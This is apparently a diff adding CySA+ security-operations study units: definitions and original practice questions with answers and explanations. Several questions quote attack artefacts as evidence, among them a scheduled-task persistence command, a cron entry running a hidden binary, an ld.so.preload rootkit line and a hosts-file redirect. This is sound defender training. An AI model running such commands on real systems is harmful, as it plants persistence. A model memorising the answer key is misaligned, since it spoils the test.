@@ -1,0 +1,631 @@
+# CompTIA CySA+ CS0-004 - domain 1 (Security Operations) extension.
+# Original content written against the public exam objectives. No real exam items.
+# Syllabus: docs/research/notes/blueprint_cysa_plus.md
+#   cy-1x   coverage of objectives 1.1-1.3 that the base course names but does not test
+#   cy-1y   coverage of objectives 1.4-1.6
+#   cy-1z2  exam-hard practice built around inline artefacts (logs, process trees,
+#           packet summaries, rules, scripts)
+# Addresses and domains use documentation ranges (192.0.2.0/24, 198.51.100.0/24,
+# 203.0.113.0/24) and .example names.
+part_of: cysa-plus
+units:
+  - id: cy-1x
+    title: "Security operations: the rest of objectives 1.1 to 1.3"
+    domain: "1"
+    goal: "I can explain every architecture, identity, data and tool topic in objectives 1.1 to 1.3 and use it to read a piece of evidence."
+    notes: |
+      The foundations units taught the core of objectives 1.1 to 1.3. This unit fills in the rest, name by name.
+
+      **Architecture.** Retention and source configuration decide what evidence exists at all. Hardening removes what an attacker could use. Guests share a hypervisor and containers share a kernel, so a break-out reaches everything on the host. Cloud-native and hybrid estates spread logs across providers: if the cloud control-plane log is not ingested, the SOC is blind there.
+
+      **Identity.** **Kerberos** authenticates inside Windows domains with tickets; **SAML** carries XML assertions for web single sign-on; **OAuth 2.0** grants delegated access with tokens; **OpenID Connect** adds login on top of OAuth.
+
+      **Encryption and data.** Encoding is not encryption. Forward secrecy means a stolen server key cannot decrypt a recorded session. **DLP** finds sensitive content such as **cardholder data**; a **CASB** controls which cloud services it may reach.
+
+      **Devices and OT.** **MDM** enforces policy on phones; **EDR** records and acts on computers; **XDR** joins endpoint, identity, email and cloud data. A **PLC** runs the physical process and **SCADA** supervises it from afar.
+
+      **Tools.**
+
+      | Question | Tool |
+      |---|---|
+      | Who registered this domain, and when? | WHOIS |
+      | Has anyone reported this address? | AbuseIPDB |
+      | Roughly where is this address? | GeoIP |
+      | Do engines already know this hash? | VirusTotal |
+      | What do other defenders know? | OTX, MISP, OpenCTI |
+    items:
+      # ── 1.1 architecture, identity, data ──
+      - {id: cy-1x-log-retention, type: concept, term: "Log retention policy",
+         def: "The rule that sets how long each type of event record is kept, and in which storage tier, before it is deleted, balancing investigation needs, legal duties and cost."}
+      - {id: cy-1x-hardening, type: concept, term: "System hardening",
+         def: "Reducing a host's attack surface by removing unneeded software and services, closing ports, disabling default accounts and applying secure configuration settings."}
+      - {id: cy-1x-vm-escape, type: concept, term: "Virtual machine escape",
+         def: "An attack in which code running inside a guest breaks out of its isolation to run on the underlying host or to reach other guests on it."}
+      - {id: cy-1x-cloud-native, type: concept, term: "Cloud-native architecture",
+         def: "Building an application as small, independently deployed services on managed platforms, containers or functions that are created and destroyed automatically as demand changes."}
+      - {id: cy-1x-hybrid-cloud, type: concept, term: "Hybrid cloud",
+         def: "An environment that combines on-premises systems with one or more public cloud services, connected and managed as a single estate."}
+      - {id: cy-1x-mdm, type: concept, term: "Mobile device management (MDM)",
+         def: "Central software that enrols phones and tablets, pushes configuration and security policy to them, checks their compliance and can lock or wipe them remotely."}
+      - {id: cy-1x-edr, type: concept, term: "Endpoint detection and response (EDR)",
+         def: "An agent on each computer that records detailed process, file, registry and network activity, detects suspicious behaviour and lets responders isolate the host or kill processes remotely."}
+      - {id: cy-1x-xdr, type: concept, term: "Extended detection and response (XDR)",
+         def: "A detection platform that correlates endpoint telemetry with email, identity, network and cloud sources into single incidents, with response actions across all of them."}
+      - {id: cy-1x-saml, type: concept, term: "Security Assertion Markup Language (SAML)",
+         def: "An XML-based standard in which an identity provider sends a signed statement about a user to a service provider, giving web single sign-on across organizations."}
+      - {id: cy-1x-oauth, type: concept, term: "OAuth 2.0",
+         def: "A framework that lets a user grant an application limited, delegated access to resources on the user's behalf through access tokens, without handing over the password."}
+      - {id: cy-1x-oidc, type: concept, term: "OpenID Connect (OIDC)",
+         def: "An authentication layer built on a delegated-authorization framework that adds a signed ID token telling the application who the user is."}
+      - {id: cy-1x-kerberos, type: concept, term: "Kerberos",
+         def: "A ticket-based authentication protocol in which a trusted key distribution center issues a ticket-granting ticket and then service tickets, so passwords never cross the network."}
+      - {id: cy-1x-forward-secrecy, type: concept, term: "Perfect forward secrecy",
+         def: "A key-exchange property in which every session uses a fresh temporary key, so a server's long-term private key stolen later cannot decrypt recorded sessions."}
+      - {id: cy-1x-dlp, type: concept, term: "Data loss prevention (DLP)",
+         def: "Controls that inspect data in use, in motion and at rest for sensitive content such as card numbers or labelled documents, and block, alert on or encrypt it according to policy."}
+      - {id: cy-1x-casb, type: concept, term: "Cloud access security broker (CASB)",
+         def: "A policy enforcement point between users and cloud services that shows which cloud applications are in use and controls what data may be put into each one."}
+      - {id: cy-1x-chd, type: concept, term: "Cardholder data (CHD)",
+         def: "The primary account number on a payment card, alone or with the holder's name, expiry date or service code, which PCI DSS requires merchants to protect."}
+      - {id: cy-1x-scada, type: concept, term: "Supervisory control and data acquisition (SCADA)",
+         def: "A system that gathers readings from, and sends commands to, field equipment spread across a wide area, such as a pipeline or power grid, from a central control room."}
+      - {id: cy-1x-plc, type: concept, term: "Programmable logic controller (PLC)",
+         def: "A ruggedized industrial computer that reads sensors and drives actuators such as motors and valves by running its control logic in a continuous scan cycle."}
+      - {id: cy-1x-q01, type: mcq,
+         q: "Investigators ask who deleted a project folder on a Windows file server last week. The Security log has been kept for 90 days and reaches the SIEM correctly, but it holds no 4663 (object access) events at all, because object access auditing was never enabled. Which logging concern failed?",
+         choices: ["Retention", "Source configuration", "Time synchronization", "Ingestion"],
+         answer: 1,
+         why: "The events were never generated because the source was not configured to record them. Retention and ingestion are fine here: 90 days of logs reached the SIEM, they simply never contained access events."}
+      - {id: cy-1x-q02, type: mcq,
+         q: "File integrity monitoring on a Windows laptop reports a new line in C:\\Windows\\System32\\drivers\\etc\\hosts: 203.0.113.66 login.bank.example. What is the effect?",
+         choices: ["The corporate DNS server's cache is poisoned for every user", "The laptop can no longer reach the bank's site at all", "The laptop will send traffic for login.bank.example to 203.0.113.66", "The laptop's default gateway has been changed to 203.0.113.66"],
+         answer: 2,
+         why: "Windows consults the local hosts file before asking DNS, so this one machine now resolves the bank's login name to the attacker's address. Nothing changes on the DNS server, which is why other users are unaffected."}
+      - {id: cy-1x-q03, type: mcq,
+         q: "A process listing on a Windows server shows two entries: lsass.exe, PID 640, parent wininit.exe, path C:\\Windows\\System32; and lsass.exe, PID 4120, parent explorer.exe, path C:\\Users\\Public. What does this MOST likely show?",
+         choices: ["Malware disguised with the name of a system process", "A normal second instance started for a remote desktop session", "The credential service restarting after a crash", "A 32-bit copy of the service running beside the 64-bit one"],
+         answer: 0,
+         why: "Windows runs one lsass.exe, started by wininit.exe from System32. A copy started by the user's shell from a public folder is something borrowing the name to blend in."}
+      - {id: cy-1x-q04, type: mcq,
+         q: "File integrity monitoring on a Linux server reports that /etc/ld.so.preload, normally absent, now contains the line /usr/lib/x86_64-linux-gnu/libsysd.so. Why is this serious?",
+         choices: ["It schedules the library to run every minute as the root user", "It makes the system load a new kernel module at every boot", "It authorizes a new SSH key so the root account accepts it remotely", "Every dynamically linked program will now load the library"],
+         answer: 3,
+         why: "The dynamic linker loads every library listed in /etc/ld.so.preload into each program it starts, a common way for user-mode rootkits to hide files and processes. It is not cron, not a kernel module and not an SSH setting."}
+      - {id: cy-1x-q05, type: mcq,
+         q: "A review of a container deployment finds: privileged: true and a volume mounting /var/run/docker.sock from the host into the container. What is the risk?",
+         choices: ["The container's logs will not reach the SIEM", "A compromised container can take control of the host", "The container image cannot be scanned for vulnerabilities", "Other containers can read this container's environment variables"],
+         answer: 1,
+         why: "Access to the Docker socket lets a process start new containers with any host mount, which amounts to root on the host; privileged mode removes most remaining isolation. That is a break-out path, not a logging or scanning problem."}
+      - {id: cy-1x-q06, type: mcq,
+         q: "An API gateway log shows one customer's token making GET /api/v1/invoices/10041, /10042, /10043 and so on through /10950, each returning 200 with a different customer's invoice. What is the vulnerability?",
+         choices: ["Missing rate limiting on the login endpoint", "Server-side request forgery", "Broken object-level authorization", "Cross-site scripting in the invoice page"],
+         answer: 2,
+         why: "The API checks that the token is valid but not that the invoice belongs to its holder, so changing the number returns other people's records. Rate limiting would only slow the walk through the numbers; the flaw is the missing ownership check."}
+      - {id: cy-1x-q07, type: mcq,
+         q: "A company moved half its servers to a public cloud. The SIEM still collects only on-premises domain controller, firewall and server logs. During an incident nobody can tell who opened a cloud security group to the internet. What is the gap?",
+         choices: ["The cloud provider's control-plane audit log is not being ingested", "The firewall logs are kept for too short a time", "The domain controllers are not time-synchronized", "Endpoint agents are missing from the on-premises servers in the data centre"],
+         answer: 0,
+         why: "Changes to cloud resources are recorded by the provider's management-plane audit log, which in a hybrid estate must be brought into the SIEM like any other source. None of the on-premises logs could ever show a cloud console action."}
+      - {id: cy-1x-q08, type: mcq,
+         q: "An MDM compliance report shows a company phone flagged 'jailbroken: yes' that is still synchronizing corporate email. Which response uses MDM as intended?",
+         choices: ["Raise the phone's screen-lock timeout policy to five minutes", "Ask the user to stop installing apps from outside the official store", "Rely on the mail server's spam filter to protect the phone instead", "Mark it non-compliant so conditional access blocks company data"],
+         answer: 3,
+         why: "A jailbroken phone has lost the operating system's security model; MDM's compliance check exists to cut such a device off from company data automatically. A request to the user changes nothing on the device."}
+      - {id: cy-1x-q09, type: mcq,
+         q: "A user clicked 'Accept' on a consent screen for an app called 'PDF Viewer Pro' requesting Mail.Read and offline_access. The user's password was then reset, yet the cloud audit log still shows that app reading the mailbox. What will stop the access?",
+         choices: ["Resetting the password a second time", "Revoking the app's consent grant and its tokens", "Enrolling the user in MFA", "Blocking the user's sign-ins from outside the country"],
+         answer: 1,
+         why: "This is an illicit OAuth consent grant: the app holds its own delegated permission and tokens, so it does not need the password or MFA. Removing the grant and revoking its tokens ends the access."}
+      - {id: cy-1x-q10, type: mcq,
+         q: "Domain controller logs show one standard user account generating 60 event 4769 (Kerberos service ticket requested) entries in two minutes, each for a different service account, and each with ticket encryption type 0x17 (RC4). Which attack is MOST likely under way?",
+         choices: ["Golden ticket", "AS-REP roasting", "Pass-the-hash", "Kerberoasting"],
+         answer: 3,
+         why: "Requesting service tickets for many service accounts, preferring weak RC4 encryption, lets the attacker crack the service passwords offline. AS-REP roasting targets accounts without pre-authentication and shows up as TGT requests (4768), not service-ticket requests."}
+      - {id: cy-1x-q11, type: mcq,
+         q: "An analyst has the web server's private key but cannot decrypt a packet capture of TLS 1.3 sessions to that server in Wireshark. Why?",
+         choices: ["TLS 1.3 has no RSA key transport, so the server key never protects the session keys", "TLS 1.3 encrypts each session with the client's private key, which the analyst does not hold", "Wireshark cannot read TLS 1.3 at all", "The capture must be converted to JSON before decryption"],
+         answer: 0,
+         why: "TLS 1.3 removed RSA key transport: a full handshake uses ephemeral (EC)DHE, giving forward secrecy, and the server key only signs the handshake. Session keys must come from an endpoint, for example a key-log file, or from a decrypting proxy."}
+      - {id: cy-1x-q12, type: mcq,
+         q: "A configuration file in a code repository contains db_password: cGFzc3dvcmQxMjM= and the developer says the password is encrypted. What is the analyst's assessment?",
+         choices: ["It is a salted hash and cannot be reversed", "It is AES-encrypted, so it is safe as long as the key stays private", "It is a tokenized value held in a separate vault", "It is Base64 encoding, which anyone can reverse to password123"],
+         answer: 3,
+         why: "Base64 is an encoding with no key: decoding it gives password123 at once. The trailing = padding and character set are the giveaway; encrypted or hashed values would not decode to readable text."}
+      - {id: cy-1x-q13, type: mcq,
+         q: "A DLP rule fires on an outbound email attachment containing 3,000 sixteen-digit numbers that all pass the Luhn check, each next to a name and an expiry date. Which data type is this, and which standard governs it?",
+         choices: ["Protected health information, governed by HIPAA", "Cardholder data, governed by PCI DSS", "Authentication secrets, governed by the password policy", "Intellectual property, governed by trade secret law"],
+         answer: 1,
+         why: "Sixteen-digit Luhn-valid numbers with names and expiry dates are payment card numbers, and PCI DSS sets the rules for protecting them. Nothing in the attachment is medical."}
+      - {id: cy-1x-q14, type: mcq,
+         q: "In a water plant, only the engineering workstation 10.20.1.5 should change PLC settings. A flow log shows 10.20.5.77, a laptop in the office VLAN, sending Modbus/TCP function code 6 (write single register) to a PLC on port 502. What does this show?",
+         choices: ["The HMI polling the PLC for current readings", "A DNP3 time synchronization message", "An unauthorized device writing values to the controller", "Normal firmware update traffic from the vendor"],
+         answer: 2,
+         why: "Function code 6 changes a register in the PLC, which can alter the physical process, and it comes from a device that should never do so. Routine polling uses read functions such as code 3."}
+      - {id: cy-1x-q15, type: mcq,
+         q: "A user reports a message containing https://sho.rt/x7Ab. The analyst needs to know where it leads without visiting the destination. Which approach is SAFEST and actually answers the question?",
+         choices: ["Have an isolated analysis system read the redirect target without following it", "Open it in a private browser window on the analyst's own workstation, then close it", "Run a WHOIS lookup on sho.rt", "Ask the sender where the link goes"],
+         answer: 0,
+         why: "A shortener hides the destination; reading its redirect response reveals the target safely. WHOIS on the shortener only tells you who runs the shortening service, not where this link goes."}
+      - {id: cy-1x-q16, type: mcq,
+         q: "A nightly firewall configuration diff shows: + access-list OUTSIDE_IN permit tcp any host 10.0.5.20 eq 3389, added at 02:14 by the account netadmin2. There is no change ticket. What does this show?",
+         choices: ["An approved emergency change that publishes a web server to the internet", "A rule that blocks remote desktop from the internet", "A rule that applies only to traffic leaving the network", "An unauthorized change exposing an internal host's RDP to the internet"],
+         answer: 3,
+         why: "The rule permits anyone outside to reach port 3389 (RDP) on an internal server, and no ticket approves it: an unauthorized configuration change. The ACL is applied to traffic coming in from outside, and port 3389 is not a web port."}
+      - {id: cy-1x-q17, type: mcq,
+         q: "A software inventory shows AnyDesk installed on three finance PCs. It is not on the approved list, and all three users had received a phone call from 'the help desk' that morning. What is the MOST likely explanation?",
+         choices: ["A scheduled update of the remote-support tool that the help desk already uses", "Attackers had users install a remote access tool through a vishing call", "Users installing a tool to work from home", "A false positive from the inventory agent"],
+         answer: 1,
+         why: "Unauthorized remote access software appearing straight after an unsolicited 'help desk' call is the classic tech-support scam: the caller gains hands-on control. An approved tool would be on the approved list."}
+      - {id: cy-1x-q18, type: mcq,
+         q: 'An application audit log shows: user=482 role=viewer request="PUT /api/users/482 {\"role\":\"admin\"}" status=200 user_agent="python-requests/2.31", then user=482 role=admin. What happened?',
+         choices: ["Horizontal privilege escalation into another user's account", "Session hijacking by a different user", "Vertical privilege escalation through the application's API", "Cross-site request forgery from the user's browser"],
+         answer: 2,
+         why: "A viewer changed their own role to admin and the API accepted it: a gain in privilege level, which is vertical. Horizontal escalation reaches another account at the same level, and a script user agent argues against a forged browser request."}
+      # ── 1.3 tools ──
+      - {id: cy-1x-misp, type: concept, term: "MISP",
+         def: "An open-source threat-intelligence platform that stores and shares events made of indicator attributes, with tags, sharing groups and a flag marking which attributes should feed detection."}
+      - {id: cy-1x-opencti, type: concept, term: "OpenCTI",
+         def: "An open-source platform that organizes threat knowledge as a graph of STIX 2.1 objects, linking actors, campaigns, malware, techniques and indicators."}
+      - {id: cy-1x-otx, type: concept, term: "Open Threat Exchange (OTX)",
+         def: "A free community threat-intelligence service where contributors publish pulses, collections of indicators about one threat, that others can follow and query."}
+      - {id: cy-1x-abuseipdb, type: concept, term: "AbuseIPDB",
+         def: "A community database where users report abusive IP addresses by category, returning a confidence score and report history for any address looked up."}
+      - {id: cy-1x-geoip, type: concept, term: "GeoIP lookup",
+         def: "Mapping an IP address to an approximate country, city and network owner from a database; useful context, but unreliable when traffic passes through VPNs or proxies."}
+      - {id: cy-1x-whois, type: concept, term: "WHOIS",
+         def: "A query service that returns registration details for a domain or address block, such as the registrar, the registrant where not redacted, and the creation and expiry dates."}
+      - {id: cy-1x-virustotal, type: concept, term: "VirusTotal",
+         def: "An online service that checks a file, hash, URL or domain against dozens of antivirus engines and reputation sources, and keeps uploaded files available to its community."}
+      - {id: cy-1x-evtx, type: concept, term: "EVTX",
+         def: "The binary file format in which modern Windows stores its event logs, read with Event Viewer or converted to XML or JSON for analysis."}
+      - {id: cy-1x-q19, type: mcq,
+         q: "An analyst types host 10.0.0.5 and port 80 into Wireshark's display filter bar and the bar turns red. Which entry shows the intended packets?",
+         choices: ["ip.addr == 10.0.0.5 && tcp.port == 80", "src 10.0.0.5 && dst port 80", "host == 10.0.0.5 and port == 80", "ip.host 10.0.0.5 tcp 80"],
+         answer: 0,
+         why: "'host ... and port ...' is capture-filter (BPF) syntax, as used by tcpdump. Display filters name protocol fields, so the equivalent is ip.addr (source or destination) and tcp.port (either side)."}
+      - {id: cy-1x-q20, type: mcq,
+         q: "A Zeek conn.log holds 900 records from 10.3.3.3 to 900 different internal addresses, all on port 445/tcp, each with conn_state S0 and history S. What does S0 mean?",
+         choices: ["The connection was established and closed normally", "The target answered with a reset", "A SYN was seen but no reply came back", "The connection was still open when the log rotated"],
+         answer: 2,
+         why: "S0 is 'connection attempt seen, no reply', and history S shows only the originator's SYN. Rejected attempts are REJ and normal ones SF. Nine hundred unanswered SYNs to port 445 is a sweep for SMB."}
+      - {id: cy-1x-q21, type: mcq,
+         q: "A VPN sign-in for a user based in Ohio shows a GeoIP location of Amsterdam. AbuseIPDB lists the address as a commercial VPN exit node with no abuse reports. What is the MOST accurate conclusion?",
+         choices: ["The account has been compromised by an attacker located in the Netherlands", "The GeoIP database is corrupt and should be replaced", "The address is malicious and should be blocked at once", "The location tells little about the user, so other evidence must decide"],
+         answer: 3,
+         why: "GeoIP shows where the exit node is, not where the person is, and a commercial VPN is a common benign explanation. The analyst has to look at MFA, device and behaviour rather than the map."}
+      - {id: cy-1x-q22, type: mcq,
+         q: "A phishing message links to secure-payroll-portal.example. Which WHOIS field is MOST useful for judging the domain?",
+         choices: ["The registrar's abuse contact email", "The creation date, here three days ago", "The list of name servers", "The expiry date, a year from now"],
+         answer: 1,
+         why: "A newly registered domain is a strong phishing signal, because attackers register lures just before a campaign. The abuse contact is for reporting it once you have decided it is bad."}
+      - {id: cy-1x-q23, type: mcq,
+         q: "A file recovered from a breached server may contain the company's own data. The analyst wants to know whether antivirus engines already recognise it without disclosing the file. What should be done?",
+         choices: ["Search VirusTotal for the file's SHA-256 hash", "Upload the file to VirusTotal", "Submit it to a public online sandbox", "Email the file to several antivirus vendors"],
+         answer: 0,
+         why: "A hash search reveals nothing about the file's contents and returns any existing verdicts. Uploading makes the sample available to the service's community, which could expose the data and alert the attacker."}
+      - {id: cy-1x-q24, type: mcq,
+         q: "A user clicks a phishing link, enters a password on a fake page, and an hour later that account signs in to the VPN and runs a script on a laptop. The SOC wants one incident built automatically from the email, identity and endpoint events. Which tool is designed for this?",
+         choices: ["EDR", "MDM", "XDR", "A network IDS"],
+         answer: 2,
+         why: "XDR correlates endpoint data with email, identity and other sources into a single incident. EDR is the near neighbour, but it sees only the endpoint part of the chain."}
+      - {id: cy-1x-m01, type: multi,
+         q: "Which TWO tools are platforms for storing, linking and sharing threat intelligence between defenders? (Choose TWO.)",
+         choices: ["MISP", "Zeek", "Cuckoo Sandbox", "OpenCTI", "MXToolbox"],
+         answers: [0, 3],
+         why: "MISP and OpenCTI hold indicators and threat knowledge and share them. Zeek logs network traffic, Cuckoo runs samples, and MXToolbox looks up mail and DNS records."}
+      - {id: cy-1x-m02, type: multi,
+         q: "Which TWO tools run a suspicious file in an isolated environment and report what it does? (Choose TWO.)",
+         choices: ["strings", "Joe Sandbox", "YARA", "Cuckoo Sandbox", "WHOIS", "AbuseIPDB"],
+         answers: [1, 3],
+         why: "Joe Sandbox and Cuckoo Sandbox are dynamic analysis platforms. strings and YARA examine a file without running it, and WHOIS and AbuseIPDB look up domains and addresses."}
+      - {id: cy-1x-m03, type: multi,
+         q: "Which TWO file changes on a Linux server give an attacker persistence? (Choose TWO.)",
+         choices: ["A new line in /etc/crontab that runs /tmp/.x every ten minutes", "/var/log/wtmp truncated to zero bytes", "A new key appended to /root/.ssh/authorized_keys", "/etc/hostname changed to a new name", "A file deleted from /tmp"],
+         answers: [0, 2],
+         why: "A cron entry restarts the attacker's code on a schedule and an authorized key lets them log back in at will. Truncating wtmp hides past logins, which is anti-forensics, not persistence; the other two give no return path."}
+
+  - id: cy-1y
+    title: "Threat intelligence, efficiency and AI: the rest of 1.4 to 1.6"
+    domain: "1"
+    goal: "I can classify threat actors and intelligence sources, map activity to ATT&CK, and explain how process, automation and AI governance improve a SOC."
+    notes: |
+      This unit completes objectives 1.4 to 1.6.
+
+      **Actors.** An **APT** is well resourced, patient and targeted, usually for espionage. An **insider threat** already holds legitimate access, and may be malicious or simply careless.
+
+      **Sources.** **OSINT** is public; **closed-source** intelligence is paid or members-only; an **ISAC** shares between organizations in one sector. The **Traffic Light Protocol** says how far a report may travel: RED (named recipients), AMBER+STRICT (your organization only), AMBER (your organization and its clients), GREEN (your community), CLEAR (anyone).
+
+      **TTPs.** Map what you see to ATT&CK tactics and techniques. A **heat map** colours the matrix by detection coverage; **threat mapping** sets an adversary's known techniques against your own defences. **Attribution** is the least certain conclusion, because artefacts can be planted.
+
+      **Deception.** A **honeypot** is a decoy system; a **honeytoken** is a decoy record or credential.
+
+      **Efficiency.** A *playbook* sets the decisions for a type of incident; a **runbook** gives the exact steps for one task. **Infrastructure as code** makes configuration reviewable, testable and repeatable. Tune rules, enrich alerts, build dashboards and join tools with APIs, webhooks and plug-ins.
+
+      **AI.** Risks: hallucination, data exposure, **model poisoning**, **prompt injection**. Governance: an **AI usage policy** and the law on personal data. Good uses: summarizing logs, comparing artefacts, correlating events and drafting documents, always with a human check.
+    items:
+      # ── 1.4 threat intelligence and hunting ──
+      - {id: cy-1y-apt, type: concept, term: "Advanced persistent threat (APT)",
+         def: "A well-resourced, often state-backed group that targets specific organizations and stays hidden inside them for long periods, usually to steal information."}
+      - {id: cy-1y-insider, type: concept, term: "Insider threat",
+         def: "Risk posed by a current or former employee, contractor or partner who misuses access they legitimately hold, whether deliberately or through carelessness."}
+      - {id: cy-1y-heat-map, type: concept, term: "ATT&CK heat map",
+         def: "A colour-coded view of an adversary technique matrix that shows, cell by cell, how well each technique is covered by the organization's detections or how often it is used."}
+      - {id: cy-1y-threat-mapping, type: concept, term: "Threat mapping",
+         def: "Setting the techniques a relevant adversary is known to use against the organization's own assets, data sources and controls, to show exactly where it is exposed."}
+      - {id: cy-1y-attribution, type: concept, term: "Attribution",
+         def: "Judging which actor or group is responsible for an intrusion, a conclusion that is always stated with a confidence level because evidence can be faked."}
+      - {id: cy-1y-osint, type: concept, term: "Open-source intelligence (OSINT)",
+         def: "Information gathered from publicly available sources such as websites, social media, public records, code repositories and free threat feeds."}
+      - {id: cy-1y-closed-source, type: concept, term: "Closed-source intelligence",
+         def: "Threat information available only through a paid subscription, a vendor's private research or a members-only community, rather than to the public."}
+      - {id: cy-1y-tlp, type: concept, term: "Traffic Light Protocol (TLP)",
+         def: "A set of colour labels placed on shared intelligence that tells recipients how widely they may pass it on."}
+      - {id: cy-1y-q01, type: mcq,
+         q: "A defence contractor finds an intruder who has been inside for 14 months, used malware written only for this target, moved slowly between engineering servers and taken only design documents. No ransom was demanded. Which actor type BEST fits?",
+         choices: ["Hacktivist", "Opportunistic cybercriminal", "Unintentional insider", "Advanced persistent threat"],
+         answer: 3,
+         why: "Long dwell time, custom tooling, careful movement and theft of intellectual property point to a resourced, targeted espionage group. A criminal would want money, and a hacktivist would want publicity."}
+      - {id: cy-1y-q02, type: mcq,
+         q: "DLP shows an HR officer emailing a spreadsheet of staff salaries to her personal address every Friday. Asked, she says she finishes her work at home at weekends and did not know it was against policy. How should this be classified?",
+         choices: ["Malicious insider threat", "Unintentional insider threat", "Business email compromise", "External data breach by an APT"],
+         answer: 1,
+         why: "She holds legitimate access and moved the data out of control without intent to harm: an unintentional (negligent) insider. The data is still exposed, which is why it counts as an insider threat at all."}
+      - {id: cy-1y-q03, type: mcq,
+         q: "A malware sample contains Cyrillic debug strings and was compiled during office hours in UTC+3. A manager wants the report to name the country responsible. What is the BEST response?",
+         choices: ["Name the country, since two independent indicators agree", "Leave the strings out of the report as irrelevant", "Report them as low-confidence evidence that could be planted", "Ask a threat-intel vendor to confirm the country so the report can state it as fact"],
+         answer: 2,
+         why: "Language strings and compile times are easy to fake as false flags, so they support only a low-confidence judgement. Removing them would throw away useful evidence; stating them as proof would overclaim."}
+      - {id: cy-1y-q04, type: mcq,
+         q: "EDR records: schtasks /create /tn \"OneDrive Sync\" /tr C:\\ProgramData\\od.exe /sc onlogon /ru SYSTEM. Which ATT&CK tactic is the attacker MOST directly pursuing?",
+         choices: ["Persistence", "Discovery", "Exfiltration", "Lateral movement"],
+         answer: 0,
+         why: "A task that runs the attacker's program at every logon keeps it running across reboots: persistence. Nothing is being learned about the environment (discovery), sent out or run on another host."}
+      - {id: cy-1y-q05, type: mcq,
+         q: "An intrusion group always creates the named pipe \\\\.\\pipe\\msagent_81 on infected hosts. Where does a detection on that pipe name sit on the Pyramid of Pain?",
+         choices: ["Hash values", "Domain names", "Network and host artifacts", "Tactics, techniques and procedures"],
+         answer: 2,
+         why: "A pipe name is a host artifact: harder for the group to change than a hash, address or domain because it lives in their tooling, but easier than changing how they operate."}
+      - {id: cy-1y-q06, type: mcq,
+         q: "Three feeds report the same domain as malicious. Two of them simply copy the third, which has a history of listing popular sites by mistake. Which quality of this intelligence is MOST in doubt?",
+         choices: ["Timeliness", "Accuracy", "Relevance", "Volume"],
+         answer: 1,
+         why: "Three listings that all come from one error-prone source add no corroboration, so whether the claim is true is in doubt. The report may be current and relevant and still be wrong."}
+      - {id: cy-1y-q07, type: mcq,
+         q: "A SOC pays a vendor for a feed of indicators and analyst reports that is available only to subscribers. What kind of source is this?",
+         choices: ["Open-source intelligence", "Internal intelligence", "Human intelligence from an informant", "Closed-source intelligence"],
+         answer: 3,
+         why: "Access restricted to paying customers makes it closed-source. Internal intelligence comes from the organization's own telemetry and incidents."}
+      - {id: cy-1y-q08, type: mcq,
+         q: "A report from a sector partner is marked TLP:AMBER+STRICT. The SOC wants to pass it to the external managed service provider that runs its firewalls. What does the label allow?",
+         choices: ["Sharing with the provider, because it works for the organization", "Sharing with anyone in the same sector", "Publishing a summary on the company blog", "Sharing only inside the SOC's own organization"],
+         answer: 3,
+         why: "AMBER+STRICT limits the report to the recipient's organization. Plain TLP:AMBER would also allow the organization's clients on a need-to-know basis, and GREEN allows the wider community."}
+      - {id: cy-1y-q09, type: mcq,
+         q: "A cloud audit log records a call made with access key AKIA...Q7 from 198.51.100.40. That key was created for no user or service; it was planted in an old configuration file on a file share. What does the event show?",
+         choices: ["A honeytoken was triggered: someone read the share and tried the key", "A service account is still using an old key that should have been rotated", "A honeypot server has been scanned from the internet", "A developer is testing a new integration"],
+         answer: 0,
+         why: "A planted credential with no legitimate use is a honeytoken; any use means someone found it and tried it. A honeypot is a decoy system, not a decoy key."}
+      - {id: cy-1y-q10, type: mcq,
+         q: "A user tells a bank that a large transfer from his account was not his. The application records only that a transfer was made, with no session, device or authentication details, so neither side can prove who made it. Which STRIDE category does this weakness fall under?",
+         choices: ["Spoofing", "Tampering", "Elevation of privilege", "Repudiation"],
+         answer: 3,
+         why: "Repudiation is the ability to deny an action because the system cannot prove who did it; the fix is attributable, protected logging. Spoofing would be someone posing as the user, which the missing logs cannot even show."}
+      - {id: cy-1y-q11, type: mcq,
+         q: "A hunt team is choosing its next hypothesis. Which statement is a well-formed, testable hunting hypothesis?",
+         choices: ["We might have been breached at some point", "If an intruder is collecting credentials here, we will see processes opening handles to lsass.exe that are not our EDR or backup agents", "Attackers are getting more sophisticated every year", "We should buy a better SIEM"],
+         answer: 1,
+         why: "A hypothesis names a behaviour and the data that would show it, so it can be confirmed or rejected. The others are worries or purchases, not something a query can test."}
+      - {id: cy-1y-q12, type: mcq,
+         q: "Intelligence says a ransomware group targeting the company's sector uses 14 specific ATT&CK techniques. The SOC lists, for each one, which log source would show it and which detection exists. Two have no data source at all. What has the SOC just done?",
+         choices: ["Threat mapping against its own defences", "Attribution of the ransomware group", "A tabletop exercise", "A vulnerability scan"],
+         answer: 0,
+         why: "Setting a relevant adversary's techniques against the organization's own data and detections is threat mapping, and it exposed two blind spots. Nothing here identifies who is responsible."}
+      # ── 1.5 efficiency ──
+      - {id: cy-1y-runbook, type: concept, term: "Runbook",
+         def: "A detailed, step-by-step technical procedure for carrying out one specific operational task, such as disabling an account or isolating a host, often written so it can be automated."}
+      - {id: cy-1y-iac, type: concept, term: "Infrastructure as code (IaC)",
+         def: "Defining servers, networks and cloud resources in machine-readable template files kept under version control, so environments are built the same way every time."}
+      - {id: cy-1y-plugin, type: concept, term: "Plug-in (security tool)",
+         def: "An add-on module that extends a platform such as a SIEM or SOAR with a new connector, parser or action without changing the platform itself."}
+      - {id: cy-1y-q13, type: mcq,
+         q: "Someone opened a cloud security group to 0.0.0.0/0 through the web console. The environment is defined in Terraform. How does infrastructure as code help the SOC here?",
+         choices: ["It makes changes made through the web console technically impossible", "It encrypts the security group's rules", "Drift from the reviewed template can be detected and reverted", "It replaces the need for cloud audit logs"],
+         answer: 2,
+         why: "IaC gives a reviewed, version-controlled statement of what should exist, so drift can be detected and reversed. It does not stop console changes on its own, and the audit log is still needed to show who made them."}
+      - {id: cy-1y-q14, type: mcq,
+         q: "Each analyst on the night shift opens four consoles to check the health of log sources, alert queues and EDR coverage at the start of a shift. Which improvement BEST streamlines this?",
+         choices: ["A written checklist listing the four consoles and what to check in each", "A dashboard that shows those measures on one screen", "A longer handover meeting", "Fewer log sources"],
+         answer: 1,
+         why: "Dashboard creation is a named way to streamline operations: the same facts are gathered automatically in one place. A checklist still leaves four consoles to open."}
+      # ── 1.6 AI ──
+      - {id: cy-1y-model-poisoning, type: concept, term: "Model poisoning",
+         def: "Corrupting the data a machine-learning model learns from, so that it makes the mistakes the attacker wants, such as treating a malware family as clean."}
+      - {id: cy-1y-prompt-injection, type: concept, term: "Prompt injection",
